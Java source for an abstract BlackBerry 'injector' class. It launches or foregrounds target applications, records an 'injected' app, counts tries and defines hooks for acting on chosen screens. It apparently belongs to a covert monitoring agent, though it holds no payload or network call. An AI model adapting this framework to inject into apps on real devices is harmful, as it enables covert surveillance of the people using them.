package blackberry.injection.injectors;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public abstract class AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("Injector", DebugLevel.VERBOSE);
    //#endif
    private UiApplication injectedApp = null;
    private int tries = 0;
    private boolean enabled = true;

    public abstract String getAppName();

    public abstract String getCodName();

    public abstract String[] getWantedScreen();

    public abstract void playOnScreen(Screen screen);

    public final boolean enabled() {
        return enabled;
    }

    public final void disable() {
        enabled = false;
    }

    public void incrTries() {
        tries++;
    }

    public int getTries() {
        return tries;
    }

    public void resetTries() {
        tries = 0;
    }

    public void injected(){
        
    }
    public void setInjectedApp(UiApplication app) {
        //#ifdef DEBUG
        debug.trace("setInjectedApp: INJECTED");
        //#endif
        this.injectedApp = app;
        injected();
    }

    public UiApplication getInjectedApp() {
        return injectedApp;
    }

    public boolean isInjected() {
        return injectedApp != null;
    }

    protected void setClipboard(String clip) {

    }

    protected void enableClipboard() {

    }

    protected void disableClipboard() {

    }

    public boolean execute(String codName) {
        return executeForeground(codName);
    }

    protected final boolean executeSchedule(String codName) {
        try {
            ApplicationManager manager = ApplicationManager
                    .getApplicationManager();
            int handle = CodeModuleManager.getModuleHandle(codName);
            if (handle > 0) {
                ApplicationDescriptor desc = CodeModuleManager
                        .getApplicationDescriptors(handle)[0];

                ApplicationManager.getApplicationManager().runApplication(desc);
                Utils.sleep(200);
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }
    }

    protected final boolean executeForeground(String codName) {
        ApplicationManager manager = ApplicationManager.getApplicationManager();

        int foregroundPin = manager.getForegroundProcessId();
        ApplicationDescriptor[] apps = manager.getVisibleApplications();
        for (int i = 0; i < apps.length; i++) {
            if (apps[i].getModuleName().indexOf(codName) >= 0) {
                int processId = manager.getProcessId(apps[i]);

                if (foregroundPin == processId) {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: already foreground");
                    //#endif
                    return true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("requestForeground: bringing foreground");
                    //#endif
                    manager.requestForeground(processId);
                    return true;
                }
            }
        }

        return false;
    }

}
